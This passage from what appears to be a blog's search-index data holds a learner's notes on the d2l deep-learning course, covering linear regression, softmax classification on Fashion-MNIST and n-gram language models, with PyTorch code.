number </span></span><br><span class=\"line\">    indices = <span class=\"built_in\">list</span>(<span class=\"built_in\">range</span>(num_examples))</span><br><span class=\"line\">    <span class=\"comment\"># NO particular order</span></span><br><span class=\"line\">    random.shuffle(indices)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, num_examples, batch_size):</span><br><span class=\"line\">        batch_indices = np.array(</span><br><span class=\"line\">            indices[i: <span class=\"built_in\">min</span>(i + batch_size, num_examples)])</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(indices[i: <span class=\"built_in\">min</span>(i + batch_size, num_examples)])</span><br><span class=\"line\">        <span class=\"keyword\">yield</span> features[batch_indices], labels[batch_indices]</span><br><span class=\"line\">batch_size = <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> X, y <span class=\"keyword\">in</span> data_iter(batch_size, features, labels):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(X, <span class=\"string\">&#x27;\\n&#x27;</span>, y)</span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<h2><span id=\"83-init-the-model-parameter\">8.3 Init the Model Parameter</span></h2><p>Use the autoderivation to work out gradient .<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">w = np.random.normal(<span class=\"number\">0</span>, <span class=\"number\">0.01</span>, (<span class=\"number\">2</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">b = np.zeros(<span class=\"number\">1</span>)</span><br><span class=\"line\">w.attach_grad()</span><br><span class=\"line\">b.attach_grad()</span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"84-define-model-and-loss-function\">8.4 Define Model and Loss Function</span></h2><p>Intuitive code to understand:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">linreg</span>(<span class=\"params\">X, w, b</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Linear Regression&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> np.dot(X, w) + b</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">squared_loss</span>(<span class=\"params\">y_hat, y</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Square Error&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (y_hat - y.reshape(y_hat.shape)) ** <span class=\"number\">2</span> / <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"comment\"># unify the y_hat and y &#x27;s shape to avoid potential error.</span></span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"85-define-optimize-algorithm\">8.5 Define Optimize Algorithm</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sgd</span>(<span class=\"params\">params, lr, batch_size</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;minibatch gradient descent&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> param <span class=\"keyword\">in</span> params:</span><br><span class=\"line\">        param -= lr * param.grad / batch_size</span><br><span class=\"line\">        param.grad.zero_()</span><br><span class=\"line\">        <span class=\"comment\"># auto-update param </span></span><br></pre></td></tr></table></figure>\n<h2><span id=\"86-training\">8.6 Training</span></h2><p>First we descript the proccedure of training model in a natural language form.<br>1) Set hyperparameters.<br>2) Input the trainning datas into loss function to caculate the loss<br>3) Caculate the gradient of l towards [w,b] using backward propagation.<br>4) Optimize the parameter.</p>\n<p>Code realization:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-17%20at%205.36.19%20PM.png\" alt=\"Screen Shot 2023-03-17 at 5.36.19 PM\"></p>\n<h2><span id=\"87-concise-realization\">8.7 Concise Realization</span></h2><p>In a word , this part will use some encapsulated package to simplify the former steps like define the dataset reading, model, optimize algorithm ,etc.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch.utils <span class=\"keyword\">import</span> data</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\">true_w = torch.tensor([<span class=\"number\">2</span>,-<span class=\"number\">3.4</span>])</span><br><span class=\"line\">true_b = <span class=\"number\">4.2</span></span><br><span class=\"line\">features,labels = d2l.synthetic_data(true_w,true_b,<span class=\"number\">1000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">load_array</span>(<span class=\"params\">data_arrays, batch_size, is_train=<span class=\"literal\">True</span></span>):</span> </span><br><span class=\"line\">    dataset = data.TensorDataset(*data_arrays)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data.DataLoader(dataset,batch_size,shuffle = is_train)</span><br><span class=\"line\"></span><br><span class=\"line\">batch_size = <span class=\"number\">10</span></span><br><span class=\"line\">data_iter = load_array((features,labels),batch_size)</span><br><span class=\"line\"><span class=\"built_in\">next</span>(<span class=\"built_in\">iter</span>(data_iter))</span><br><span class=\"line\"></span><br><span class=\"line\">net[<span class=\"number\">0</span>].weight.data.normal_(<span class=\"number\">0</span>, <span class=\"number\">0.01</span>)</span><br><span class=\"line\">net[<span class=\"number\">0</span>].bias.data.fill_(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># define the key function</span></span><br><span class=\"line\">net = nn.Sequential(nn.Linear(<span class=\"number\">2</span>, <span class=\"number\">1</span>))<span class=\"comment\">#(input:2D ,output:1D)</span></span><br><span class=\"line\">loss = nn.MSELoss()</span><br><span class=\"line\">trainer = torch.optim.SGD(net.parameters(), lr=<span class=\"number\">0.03</span>)</span><br><span class=\"line\">num_epochs = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> epoch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_epochs):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> X, y <span class=\"keyword\">in</span> data_iter:</span><br><span class=\"line\">        l = loss(net(X) ,y)</span><br><span class=\"line\">        trainer.zero_grad()</span><br><span class=\"line\">        l.backward()</span><br><span class=\"line\">        trainer.step()<span class=\"comment\"># parameter update</span></span><br><span class=\"line\">    l = loss(net(features), labels)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;epoch <span class=\"subst\">&#123;epoch + <span class=\"number\">1</span>&#125;</span>, loss <span class=\"subst\">&#123;l:f&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># epoch 1, loss 0.000175</span></span><br><span class=\"line\"><span class=\"comment\"># epoch 2, loss 0.000088</span></span><br><span class=\"line\"><span class=\"comment\"># epoch 3, loss 0.000087</span></span><br></pre></td></tr></table></figure>\n","categories":["ML"],"tags":["d2l"]},{"title":"09_Softmax","url":"/2023/03/17/D2l_009_Softmax/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-YSHxgptW\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>So in this module we will expand to a brand-new vision — photo classification.<br>Although the name Softmax regression contains “regression”, it is excatly a method to process the classfication problem.<br>Accounting for saving times, we just omit the the derivation process of how the classfication problem can be expressed in a abstract way, and only focus on the conclusion.</p>\n<h2><span id=\"91-classification\">9.1 Classification</span></h2><h3><span id=\"911-one-hot-encoding\">9.1.1 one-hot encoding</span></h3><p>Using<code>one-hot encoding</code>to present the different classes  because In most conditions we care less about the exact meaning or name of an object, we only want to sort it out.<br>e.g :  (1,0,0) corresponding to “cat”,(0,1,0)to “chicken”, and (0,0,1) to “dog”:</p>\n<script type=\"math/tex; mode=display\">\ny \\in \\{(1,0,0),(0,1,0),(0,0,1)\\}</script><h3><span id=\"912-model\">9.1.2 Model</span></h3><p>So whatever the final outputs are ,it’s definetely a multi-output with coreesponded input.<br>Back to the example before,  we want to classify some pictrues includeing cat,dog,and chicken, so we can easliy image in model with 3 output likes that :<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-18%20at%207.33.56%20PM.png\" alt=\"Screen Shot 2023-03-18 at 7.33.56 PM\"></p>\n<p>And the three output have been encoded with one-hot encoding.<br>So how about input?<br>First of all we clear that what we want to input into the layer is the featrues of our dataset, so let us image a dataset with a 4-type featrues.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-18%20at%207.42.31%20PM.png\" alt=\"Screen Shot 2023-03-18 at 7.42.31 PM\"></p>\n<p>From the figure we can find that each output is effected by all of the input,we can transform the figure into the form of equation like that:</p>\n<script type=\"math/tex; mode=display\">\no_{1} = x_{1}w_{11}+x_{2}w_{12}+x_{3}w_{13}+x_{4}w_{14} +b_{1}</script><script type=\"math/tex; mode=display\">\no_{2} = x_{1}w_{21}+x_{2}w_{22}+x_{3}w_{23}+x_{4}w_{24} +b_{2}</script><script type=\"math/tex; mode=display\">\no_{3} = x_{1}w_{31}+x_{2}w_{32}+x_{3}w_{33}+x_{4}w_{34} +b_{3}</script><p>And the deep neural network, we call this layer the “full connection layer”.</p>\n<h4><span id=\"9121-disscusion-parameter-overhead-of-the-full-connection-layer\">9.1.2.1 Disscusion: parameter overhead of the full connection layer</span></h4><p>So as we can see in the above equations, the total parameters are 12 ,with the input number multiply the output number.<br>In general ,for a full connection layer , with d input and q output, the parameter overhead is d(dq). It’s a horrorable expense for a network .<br>Fortunately, the solution will be introduced in the latter module.</p>\n<h2><span id=\"92-softmax\">9.2 Softmax</span></h2><p>Think about that question: if our output from the network are the one-hot encoding of any given pictures?</p>\n<p>Maybe they are, but how can we present them?<br>So recall that each categoried can be scripted as that form:</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{y} = [y_{1},y_{2},\\dots,y_{n}]^T</script><p>which:</p>\n<script type=\"math/tex; mode=display\">\ny_{i} =  \\begin{cases}\n1 \\ ,\\ \\ \\ \\ if  \\ \\  \\ i=y \\\\  \\\\\n0, \\ \\ \\ \\ otherwise\n\\end{cases}</script><p>Clear that although the categories are diverse, but the output for each epoch only indicates one category.<br>e.g: The picture draws a cat , indexed with one-hot encoding in [0,0,1], so when you input this picture, the model can only consider the  [0,0,1] for a correct outcome.<br>Unexptectly, not everytime the model can output the precise output, sometimes  it will output the vector likes that [0.1,0.2,0.9], and obviously it can’t explicitly tell us the specific category, I can just observe the vector  [0.1,0.2,0.9], somehow ambiguous.<br>Why don’s we present the output as the probability of some categories?<br>Image that we only require one yi which equals to 1(or just close to it), and all of the output’s sum is 1, it’s entirely capatable and legal probability distribution.<br>The idea is clear that: Using probability of sorted into specific category to represent the output, if the  output is [0.1,0.2,0.9], we can say “The probability of a cat is 90%”.<br>But another questions comes behind: how to use mathematical language to discribe this transformation?<br>Finally it’s turn of the softmax fnuction.<br>We introduce softmax function to adapt this problem perfectly,which the idea just derive from the same source — to regulaze  some predictions into standard values.</p>\n<script type=\"math/tex; mode=display\">\n\\hat{\\mathbf{y}} = softmax(\\mathbf{o}),\\ \\  \\ s.t \\  \\ \\hat{y_{i}} = \\frac{\\exp({o_{j}})}{\\sum_{k}\\exp(o_{k})}</script><p>BTW, we can still choose the category by judge the output vectors without a softmax function,since:</p>\n<script type=\"math/tex; mode=display\">\nargmax_{j} \\hat{y_{j}} = argmax_{j} o_{j}</script><h2><span id=\"93-loss-function\">9.3 Loss Function</span></h2><h3><span id=\"931-cross-entropy-loss\">9.3.1 Cross-Entropy Loss</span></h3><p>Arguably, it’s fanciful to use y - y_hat to estimate the loss since y_hat is a completely probability condition with no relationship with the primary labeled value “1”.<br>Hence we need to work out a new way to judge the model qulity.<br>We introduce Cross-Entropy Loss to address the problem.</p>\n<p>Cross-Entropy Loss is often used to measure the difference of two probability.</p>\n<script type=\"math/tex; mode=display\">\nH(p,q) = \\sum_{i}-p_{i}\\log(q_{i})</script><p>Applying it into our loss function ,it will change into the form likes that:</p>\n<script type=\"math/tex; mode=display\">\nH(y,\\hat{y}) = \\sum_{i}-y_{i}\\log(\\hat{y_{i}})</script><p>since the sum of yi is 1, then loss function can be defineted as:</p>\n<script type=\"math/tex; mode=display\">\nl(\\mathbf{y},\\hat{\\mathbf{y}})=-log \\  \\hat{y_{i}}</script><h3><span id=\"931-gradient\">9.3.1 Gradient</span></h3><p>Simiarly we can ‘t apply the former method, like work out the partial darivation towards some parameters. Therefore we just use some physical defination , to express the gradient:</p>\n<script type=\"math/tex; mode=display\">\n\\partial _{o_{i}}l(\\mathbf{y},\\mathbf{\\hat{y}}) = softmax(o)_{i}-y_{i}</script><h2><span id=\"94-realization-in-pytorch\">9.4 Realization in Pytorch</span></h2><h3><span id=\"941-dataset-preprocessing\">9.4.1 Dataset Preprocessing</span></h3><h4><span id=\"9411-reading-dataset\">9.4.1.1 reading dataset</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">%matplotlib inline</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torchvision</span><br><span class=\"line\"><span class=\"comment\">#the specialized package to process graph</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> torchvision <span class=\"keyword\">import</span> transforms</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch.utils <span class=\"keyword\">import</span> data</span><br><span class=\"line\"></span><br><span class=\"line\">d2l.use_svg_display() <span class=\"comment\"># use svg format to display photos</span></span><br><span class=\"line\"></span><br><span class=\"line\">trans = transforms.ToTensor()</span><br><span class=\"line\"><span class=\"comment\"># Convert a PIL Image or n-d array to tensor and scale the values accordingly ---&gt;  [0, 255](PIL) -&gt; [0,1](tensor)</span></span><br><span class=\"line\"></span><br><span class=\"line\">mnist_train = torchvision.datasets.FashionMNIST(</span><br><span class=\"line\">    root=<span class=\"string\">&quot;../data&quot;</span>, train=<span class=\"literal\">True</span>, transform=trans, download=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">mnist_test = torchvision.datasets.FashionMNIST(</span><br><span class=\"line\">    root=<span class=\"string\">&quot;../data&quot;</span>, train=<span class=\"literal\">False</span>, transform=trans, download=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n<p>One essential step in machine learning is divide the dataset into train set and the test set , and the test set should not to be set too large. </p>\n<h4><span id=\"9412-dataset-overview\">9.4.1.2 dataset overview</span></h4><p>In general we just want to get approximate impression about the dataset, like its size, length, dimension,and maybe some stastic characteristics.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">len</span>(mnist_train), <span class=\"built_in\">len</span>(mnist_test)</span><br><span class=\"line\"><span class=\"comment\">#(60000, 10000)</span></span><br><span class=\"line\">mnist_train[<span class=\"number\">0</span>][<span class=\"number\">0</span>].shape</span><br><span class=\"line\">torch.Size([<span class=\"number\">1</span>, <span class=\"number\">28</span>, <span class=\"number\">28</span>])</span><br></pre></td></tr></table></figure>\n<p><code>torch.Size([1, 28, 28])</code> shows that each of the photo size is 28x28 pixels, with only one color channel(Graysca lmage)<br>Then we tag the the text label with a corresponded number:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_fashion_mnist_labels</span>(<span class=\"params\">labels</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;return the number label from the txet&quot;&quot;&quot;</span></span><br><span class=\"line\">    text_labels = [<span class=\"string\">&#x27;t-shirt&#x27;</span>, <span class=\"string\">&#x27;trouser&#x27;</span>, <span class=\"string\">&#x27;pullover&#x27;</span>, <span class=\"string\">&#x27;dress&#x27;</span>, <span class=\"string\">&#x27;coat&#x27;</span>,</span><br><span class=\"line\">                   <span class=\"string\">&#x27;sandal&#x27;</span>, <span class=\"string\">&#x27;shirt&#x27;</span>, <span class=\"string\">&#x27;sneaker&#x27;</span>, <span class=\"string\">&#x27;bag&#x27;</span>, <span class=\"string\">&#x27;ankle boot&#x27;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [text_labels[<span class=\"built_in\">int</span>(i)] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> labels]</span><br></pre></td></tr></table></figure><br>Then we want to draw so<br>me pictures out:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show_images</span>(<span class=\"params\">imgs, num_rows, num_cols, titles=<span class=\"literal\">None</span>, scale=<span class=\"number\">1.5</span></span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;绘制图像列表&quot;&quot;&quot;</span></span><br><span class=\"line\">    figsize = (num_cols * scale, num_rows * scale)</span><br><span class=\"line\">    _, axes = d2l.plt.subplots(num_rows, num_cols, figsize=figsize)</span><br><span class=\"line\">    axes = axes.flatten()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, (ax, img) <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(<span class=\"built_in\">zip</span>(axes, imgs)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> torch.is_tensor(img):</span><br><span class=\"line\">            <span class=\"comment\"># 图片张量</span></span><br><span class=\"line\">            ax.imshow(img.numpy())</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># PIL图片</span></span><br><span class=\"line\">            ax.imshow(img)</span><br><span class=\"line\">        ax.axes.get_xaxis().set_visible(<span class=\"literal\">False</span>)</span><br><span class=\"line\">        ax.axes.get_yaxis().set_visible(<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> titles:</span><br><span class=\"line\">            ax.set_title(titles[i])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> axes</span><br><span class=\"line\"></span><br><span class=\"line\">X, y = <span class=\"built_in\">next</span>(<span class=\"built_in\">iter</span>(data.DataLoader(mnist_train, batch_size=<span class=\"number\">18</span>)))</span><br><span class=\"line\"><span class=\"comment\"># automatically read the mini batch of data</span></span><br><span class=\"line\">show_images(X.reshape(<span class=\"number\">18</span>, <span class=\"number\">28</span>, <span class=\"number\">28</span>), <span class=\"number\">2</span>, <span class=\"number\">9</span>, titles=get_fashion_mnist_labels(y));</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%209.57.10%20AM.png\" alt=\"Screen Shot 2023-03-19 at 9.57.10 AM\"></p>\n <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">batch_size = <span class=\"number\">256</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_dataloader_workers</span>():</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;使用4个进程来读取数据&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\">train_iter = data.DataLoader(mnist_train, batch_size, shuffle=<span class=\"literal\">True</span>, num_workers=get_dataloader_workers())                         </span><br><span class=\"line\">timer = d2l.Timer()</span><br><span class=\"line\"><span class=\"keyword\">for</span> X, y <span class=\"keyword\">in</span> train_iter:</span><br><span class=\"line\">    <span class=\"keyword\">continue</span></span><br><span class=\"line\"><span class=\"string\">f&#x27;<span class=\"subst\">&#123;timer.stop():<span class=\"number\">.2</span>f&#125;</span> sec&#x27;</span></span><br></pre></td></tr></table></figure>\n<h4><span id=\"9413-integrate-all-components\">9.4.1.3 Integrate All Components</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">load_data_fashion_mnist</span>(<span class=\"params\">batch_size, resize=<span class=\"literal\">None</span></span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;下载Fashion-MNIST数据集，然后将其加载到内存中&quot;&quot;&quot;</span></span><br><span class=\"line\">    trans = [transforms.ToTensor()]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> resize:</span><br><span class=\"line\">        trans.insert(<span class=\"number\">0</span>, transforms.Resize(resize))</span><br><span class=\"line\">    trans = transforms.Compose(trans)</span><br><span class=\"line\">    mnist_train = torchvision.datasets.FashionMNIST(</span><br><span class=\"line\">        root=<span class=\"string\">&quot;../data&quot;</span>, train=<span class=\"literal\">True</span>, transform=trans, download=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    mnist_test = torchvision.datasets.FashionMNIST(</span><br><span class=\"line\">        root=<span class=\"string\">&quot;../data&quot;</span>, train=<span class=\"literal\">False</span>, transform=trans, download=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (data.DataLoader(mnist_train, batch_size, shuffle=<span class=\"literal\">True</span>,num_workers=get_dataloader_workers()),</span><br><span class=\"line\">\t\t    data.DataLoader(mnist_test, batch_size, shuffle=<span class=\"literal\">False</span>,num_workers=get_dataloader_workers()))</span><br><span class=\"line\"></span><br><span class=\"line\">train_iter, test_iter = load_data_fashion_mnist(<span class=\"number\">32</span>, resize=<span class=\"number\">64</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> X, y <span class=\"keyword\">in</span> train_iter:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(X.shape, X.dtype, y.shape, y.dtype)</span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n","categories":["ML"],"tags":["d2l"]},{"title":"25_Language_Model","url":"/2023/03/28/D2l_025_Language_Model/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n<h2><span id=\"251-overview\">25.1 Overview</span></h2><p>The nature of language models is caculate the probabilaty of the presence of related words .<br>For example ,we want to estimate the probability probability of occurrence of the phrase “Deep learning”, we can apple the idea of conditional probability to it:</p>\n<script type=\"math/tex; mode=display\">\n\\hat{P}(learning \\ | \\ deep) = \\frac{n(deep \\ , \\ learning)}{n(deep)}</script><script type=\"math/tex; mode=display\">\n{n(deep \\ , \\ learning)}</script><p>represents the times the phrase occurs continuously.</p>\n<h2><span id=\"252-markov-models-and-n-grams\">25.2 Markov Models and n-grams</span></h2><p>We call the probability formula with n-variables the  n-grams model.</p>\n<h5><span id=\"unigram\">unigram:</span></h5><script type=\"math/tex; mode=display\">\nP(x_{1},x_{2},x_{3},x_{4}) = P(x_{1})P(x_{2})P(x_{3})P(x_{4})</script><p> Each variable are independent.</p>\n<h5><span id=\"bigram\">bigram :</span></h5><script type=\"math/tex; mode=display\">\nP(x_{1},x_{2},x_{3},x_{4}) = P(x_{1})P(x_{2}|x_{1})P(x_{3}|x_{2})P(x_{4}|x_{3})</script><p>The variable only relates with the last variable.</p>\n<h5><span id=\"trigram\">trigram :</span></h5><script type=\"math/tex; mode=display\">\nP(x_{1},x_{2},x_{3},x_{4}) = P(x_{1})P(x_{2}|x_{1})P(x_{3}|x_{1},x_{2})P(x_{4}|x_{2},x_{3})</script><p>The current variable relates with the last two variables.</p>\n<h2><span id=\"253-natural-language-statistics\">25.3 Natural Language Statistics</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\">tokens = d2l.tokenize(d2l.read_time_machine())</span><br><span class=\"line\"><span class=\"comment\"># 因为每个文本行不一定是一个句子或一个段落，因此我们把所有文本行拼接到一起</span></span><br><span class=\"line\">corpus = [token <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> tokens <span class=\"keyword\">for</span> token <span class=\"keyword\">in</span> line]</span><br><span class=\"line\">vocab = d2l.Vocab(corpus)</span><br><span class=\"line\">vocab.token_freqs[:<span class=\"number\">10</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">[(&#x27;the&#x27;, 2261),</span></span><br><span class=\"line\"><span class=\"string\"> (&#x27;i&#x27;, 1267),</span></span><br><span class=\"line\"><span class=\"string\"> (&#x27;and&#x27;, 1245),</span></span><br><span class=\"line\"><span class=\"string\"> (&#x27;of&#x27;, 1155),</span></span><br><span class=\"line\"><span class=\"string\"> (&#x27;a&#x27;, 816),</span></span><br><span class=\"line\"><span class=\"string\"> (&#x27;to&#x27;, 695),</span></span><br><span class=\"line\"><span class=\"string\"> (&#x27;was&#x27;, 552),</span></span><br><span class=\"line\"><span class=\"string\"> (&#x27;in&#x27;, 541),</span></span><br><span class=\"line\"><span class=\"string\"> (&#x27;that&#x27;, 443),</span></span><br><span class=\"line\"><span class=\"string\"> (&#x27;my&#x27;, 440)]</span></span><br><span class=\"line\"><span class=\"string\"> &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Print the 10 words with highest frequency .</p>\n<p>As we can see ,the words seem boring, because they are usually the articles or conjunctions. We call this words the Stop Words, which are  allows to be filterated.<br>To illustrate this problem more clearly, we can draw the word frequency plot as follows:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">freqs = [freq <span class=\"keyword\">for</span> token, freq <span class=\"keyword\">in</span> vocab.token_freqs]</span><br><span class=\"line\">d2l.plot(freqs, xlabel=<span class=\"string\">&#x27;token: x&#x27;</span>, ylabel=<span class=\"string\">&#x27;frequency: n(x)&#x27;</span>,</span><br><span class=\"line\">         xscale=<span class=\"string\">&#x27;log&#x27;</span>, yscale=<span class=\"string\">&#x27;log&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-29%20at%2011.31.51%20AM.png\" alt=\"Screen Shot 2023-03-29 at 11.31.51 AM\"></p>\n<p>We can find that the  attenuation of the words frequency is high. When we clear the first several highly frequent words, the rest frequency of the words will become a straight line .</p>\n<h4><span id=\"bigram\">bigram</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">bigram_tokens = [pair <span class=\"keyword\">for</span> pair <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(corpus[:-<span class=\"number\">1</span>], corpus[<span class=\"number\">1</span>:])]</span><br><span class=\"line\"><span class=\"comment\"># [1,2,3,4] -&gt; [1,2,3] &amp; [2,3,4] -&gt; [1,2],[2,3],[3,4]</span></span><br><span class=\"line\">bigram_vocab = d2l.Vocab(bigram_tokens)</span><br><span class=\"line\">bigram_vocab.token_freqs[:<span class=\"number\">10</span>]</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-29%20at%2011.56.27%20AM.png\" alt=\"Screen Shot 2023-03-29 at 11.56.27 AM\"></p>\n<p>package the words in the words pair, then work out their frequencys.</p>\n<h4><span id=\"trigram\">trigram</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">trigram_tokens = [triple <span class=\"keyword\">for</span> triple <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(</span><br><span class=\"line\">    corpus[:-<span class=\"number\">2</span>], corpus[<span class=\"number\">1</span>:-<span class=\"number\">1</span>], corpus[<span class=\"number\">2</span>:])]</span><br><span class=\"line\">trigram_vocab = d2l.Vocab(trigram_tokens)</span><br><span class=\"line\">trigram_vocab.token_freqs[:<span class=\"number\">10</span>]</span><br></pre></td></tr></table></figure>\n<p><img 